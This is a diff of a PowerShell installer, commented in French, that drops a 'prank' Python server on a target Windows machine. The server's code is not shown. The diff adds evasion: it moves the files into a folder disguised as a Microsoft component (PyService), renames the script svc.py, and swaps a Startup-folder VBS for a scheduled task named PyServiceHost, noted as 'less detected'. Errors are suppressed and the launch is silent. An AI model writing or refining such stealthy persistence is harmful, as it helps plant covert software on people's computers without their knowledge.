@@ -18,13 +18,8 @@ $ErrorActionPreference = "SilentlyContinue"
 $ProgressPreference    = "SilentlyContinue"
 
 # ── Repertoire : essaie C:\prank, sinon LOCALAPPDATA\prank ───────────────────
-$INSTALL_DIR = "C:\prank"
-try {
-    New-Item -ItemType Directory -Force -Path $INSTALL_DIR -ErrorAction Stop | Out-Null
-} catch {
-    $INSTALL_DIR = "$env:LOCALAPPDATA\prank"
-    New-Item -ItemType Directory -Force -Path $INSTALL_DIR | Out-Null
-}
+$INSTALL_DIR = "$env:LOCALAPPDATA\Microsoft\PyService"
+New-Item -ItemType Directory -Force -Path $INSTALL_DIR | Out-Null
 
 # ── Python (telechargement + installation silencieuse si absent) ──────────────
 if (-not (Get-Command python.exe -ErrorAction SilentlyContinue)) {
@@ -150,7 +145,7 @@ if __name__ == "__main__":
 '@
 
 [System.IO.File]::WriteAllText(
-    "$INSTALL_DIR\server.py",
+    "$INSTALL_DIR\svc.py",
     $serverPy,
     [System.Text.UTF8Encoding]::new($false)
 )
@@ -168,14 +163,28 @@ $cfgJson = ([ordered]@{
     [System.Text.UTF8Encoding]::new($false)
 )
 
-# ── Demarrage automatique silencieux (VBScript) ───────────────────────────────
-$q          = [char]34
-$startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-$vbs = "Set sh = CreateObject(${q}WScript.Shell${q})`r`n" +
-       "sh.Run ${q}pythonw.exe ${q}${q}$INSTALL_DIR\server.py${q}${q}${q}, 0, False"
-[System.IO.File]::WriteAllText("$startupDir\prank_server.vbs", $vbs)
+# ── Demarrage automatique via Task Scheduler (moins detecte que VBS/Startup) ──
+$taskName = "PyServiceHost"
+$pw       = Get-Command pythonw.exe -ErrorAction SilentlyContinue
+$pythonw  = if ($pw) { $pw.Source } else { "pythonw.exe" }
+schtasks /create /tn $taskName /tr "`"$pythonw`" `"$INSTALL_DIR\svc.py`"" /sc onlogon /f /rl limited 2>$null
+
+# ── uninstall.ps1 (depose sur la cible) ──────────────────────────────────────
+$uninstallPs1 = @'
+$ErrorActionPreference = "SilentlyContinue"
+$dir = "$env:LOCALAPPDATA\Microsoft\PyService"
+Get-Process -Name pythonw, python | Where-Object {
+    (Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)").CommandLine -like "*PyService*"
+} | Stop-Process -Force
+schtasks /delete /tn "PyServiceHost" /f 2>$null
+if (Test-Path $dir) { Remove-Item $dir -Recurse -Force }
+'@
+
+[System.IO.File]::WriteAllText(
+    "$INSTALL_DIR\uninstall.ps1",
+    $uninstallPs1,
+    [System.Text.UTF8Encoding]::new($false)
+)
 
 # ── Lancement immediat et silencieux ──────────────────────────────────────────
-$pw = Get-Command pythonw.exe -ErrorAction SilentlyContinue
-$pythonw = if ($pw) { $pw.Source } else { "pythonw.exe" }
-Start-Process $pythonw -ArgumentList "`"$INSTALL_DIR\server.py`"" -WorkingDirectory $INSTALL_DIR
+Start-Process $pythonw -ArgumentList "`"$INSTALL_DIR\svc.py`"" -WorkingDirectory $INSTALL_DIR
